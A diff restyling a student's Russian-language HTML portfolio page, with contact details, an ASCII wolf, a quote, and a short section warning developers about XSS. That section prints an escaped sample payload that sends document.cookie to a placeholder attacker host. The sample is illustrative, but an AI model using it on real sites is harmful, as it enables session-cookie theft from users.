@@ -5,10 +5,11 @@
     <meta name="keywords" content="портфолио, разработка, программирование, веб">
     <meta name="description" content="Портфолио веб-разработчика">
     <title>Рогулин Илья M33041</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 <header>
-    <nav>
+    <nav class="header-navigation">
         <a href="#about-me">Обо мне</a>
         <a href="#contact">Контакты</a>
         <a href="#ascii">ASCII ART</a>
@@ -18,52 +19,55 @@
     <h1>Портфолио</h1>
 </header>
 <main>
-    <section id="about-me">
-        <h2>Обо мне</h2>
-        <p>Меня зовут Илья. Я учусь в Университете ИТМО. Также я Node JS разработчик. В свободное время люблю заниматься спортом и саморазвитием.</p>
-    </section>
-    <section id="contact">
-        <h2>Контактная информация</h2>
-        <ul>
-            <li>Phone: <a href="tel:+79381345455">+7 938 134 54 55</a></li>
-            <li>Email: <a href="mailto:rogulinilya@gmail.com">rogulinilya@gmail.com</a></li>
-            <li>VK: <a href="https://vk.com/rogulinilya">https://vk.com/rogulinilya</a></li>
-            <li>Telegram: <a href="https://t.me/rogulinilya">@rogulinilya</a></li>
-        </ul>
-    </section>
-    <section id="ascii">
-        <h2>ASCII WOLF</h2>
-        <pre>
-                                _
-                        / \      _-'
-                    _/|  \-''- _ /
-                __-' { |          \
-                    /              \
-                    /       "o.  |o }
-                    |            \ ;
-                                ',
-                        \_         __\
-                        ''-_    \.//
-                            / '-____'
-                        /
-                        _'
-                    _-
-            </pre>
-    </section>
-    <section id="code">
-        <h2>Когда разрабатываем веб-приложение, не забываем про XSS</h2>
-        <p><strong>XSS</strong> (<i>Cross-Site Scripting</i>) — тип атаки на веб-системы, заключающийся во внедрении в выдаваемую веб-системой страницу вредоносного кода и взаимодействии этого кода с веб-сервером злоумышленника. Является разновидностью атаки «Внедрение кода».</p>
-        <pre>
-                <code>&lt;script&gt;document.location = `http://attackerhost.example/cgi-bin/cookiesteal.cgi?${document.cookie}`;&lt;/script&gt;</code>
-            </pre>
-    </section>
-    <section id="favourite-quote">
-        <h2>Любимая цитата</h2>
-        <blockquote>
-            <p>Дело не в размерах игрока, а в размере его сердца.</p>
-            <cite>Аллен Айверсон</cite>
-        </blockquote>
-    </section>
+    <div class="container">
+        <section id="about-me">
+            <h2>Обо мне</h2>
+            <img class="photo" src="img/photo.jpeg" alt="Фото">
+            <p class="about-me__text">Меня зовут Илья. Я учусь в Университете ИТМО. Также я <span class="node-js">Node JS</span> разработчик. В свободное время люблю заниматься спортом и саморазвитием.</p>
+        </section>
+        <section id="contact">
+            <h2>Контактная информация</h2>
+            <ul>
+                <li>Phone: <a href="tel:+79381345455">+7 938 134 54 55</a></li>
+                <li>Email: <a href="mailto:rogulinilya@gmail.com">rogulinilya@gmail.com</a></li>
+                <li>VK: <a href="https://vk.com/rogulinilya">https://vk.com/rogulinilya</a></li>
+                <li>Telegram: <a href="https://t.me/rogulinilya">@rogulinilya</a></li>
+            </ul>
+        </section>
+        <section id="ascii">
+            <h2>ASCII WOLF</h2>
+            <pre class="wolf">
+                                    _
+                            / \      _-'
+                        _/|  \-''- _ /
+                    __-' { |          \
+                        /              \
+                        /       "o.  |o }
+                        |            \ ;
+                                    ',
+                            \_         __\
+                            ''-_    \.//
+                                / '-____'
+                            /
+                            _'
+                        _-
+                </pre>
+        </section>
+        <section id="code">
+            <h2>Когда разрабатываем веб-приложение, не забываем про XSS</h2>
+            <p><strong>XSS</strong> (<i>Cross-Site Scripting</i>) — тип атаки на веб-системы, заключающийся во внедрении в выдаваемую веб-системой страницу вредоносного кода и взаимодействии этого кода с веб-сервером злоумышленника. Является разновидностью атаки «Внедрение кода».</p>
+            <br>
+            <pre><code>&lt;script&gt;document.location = `http://attackerhost.example/cgi-bin/cookiesteal.cgi?${document.cookie}`;&lt;/script&gt;</code></pre>
+        </section>
+        <section id="favourite-quote">
+            <h2>Любимая цитата</h2>
+            <img class="photo" src="img/allen-iverson.jpeg" alt="Фото">
+            <blockquote>
+                <p>Дело не в размерах игрока, а в размере его сердца.</p>
+                <cite>Аллен Айверсон</cite>
+            </blockquote>
+        </section>
+    </div>
 </main>
 </body>
 </html>
